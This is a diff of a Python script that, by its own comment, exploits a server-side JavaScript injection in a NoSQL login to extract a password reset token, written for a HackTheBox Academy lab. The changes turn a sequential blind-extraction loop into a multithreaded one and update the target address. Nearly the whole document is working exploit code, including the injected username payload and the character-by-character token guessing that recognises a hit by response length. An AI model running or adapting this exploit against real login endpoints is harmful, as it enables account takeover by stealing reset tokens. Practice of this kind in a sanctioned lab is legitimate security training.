@@ -1,45 +1,49 @@
 #! /usr/bin/env python3
-# This script exploits a server side javascript injection on a NoSQL database.  
+# This script exploits a server side javascript injection on a NoSQL database to get the password reset token.  
 # Wrote this to solve the lab on HackTheBox Academy - NoSQL Injection - Skills Assessment II
 
 import requests
 import string
-
+import concurrent.futures
+import time
 
 def nosqli():
-    url="http://94.237.49.166:32713/login"
+    secret = ''
+    counter = 0
+    url = "http://83.136.251.226:38620/login"
+    proxies = {"http": "http://127.0.0.1:8080"}
+    headers = {"Content-type": "application/x-www-form-urlencoded"}
 
-    proxies= {
-        "http":"http://127.0.0.1:8080"
+    while counter < 40:
+        found_char = None
+        list= string.ascii_uppercase + string.digits + '-'
+        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+            future_to_char = {executor.submit(test_char, secret, char, url, proxies, headers): char for char in list}
+            for future in concurrent.futures.as_completed(future_to_char):
+                char = future_to_char[future]
+                if future.result():
+                    found_char = char
+                    break
+
+        if found_char:
+            secret += found_char
+            print(secret)
+            counter += 1
+        else:
+            counter = 10000
+
+def test_char(secret, char, url, proxies, headers):
+    data = {
+        "username": f'''"||this.token.match('^{secret}{char}.*')||"''',
+        "password": "test"
     }
-
-    headers= {
-        "Content-type":"application/x-www-form-urlencoded"
-    }
-
-    list=string.ascii_uppercase +string.digits
-    counter= 0
-    secret= ''
-    
-    while counter < 20:
-        for char in list:
-            data= f'''username="+||+this.token.match('^{secret}{char}.*')+||+""%3d%3d"//&password=test'''
-            response= requests.post(url=url, proxies=proxies, headers=headers, data=data)    
-            content= response.text
-            char_count= len(content)            
-            if char_count == 2191:
-                counter += 1
-                secret = secret + char
-                if counter == 4 or counter == 8 or counter == 12 or counter == 16:
-                    secret = secret + '-'
-                else: 
-                    pass
-                print(secret)                
-                break    
-            else:
-                pass
+    response = requests.post(url=url, proxies=proxies, headers=headers, data=data)
+    return len(response.text) == 2191
 
 try:
-    nosqli()        
+    start_time= time.time()
+    nosqli()
+    end_time= time.time()
+    print(f"Time it took to find the token: {end_time - start_time}")
 except KeyboardInterrupt:
-    print("Ctrl +c detected, shutting down gracefully...")
+    print("ctrl + c detected, exiting gracefully...")
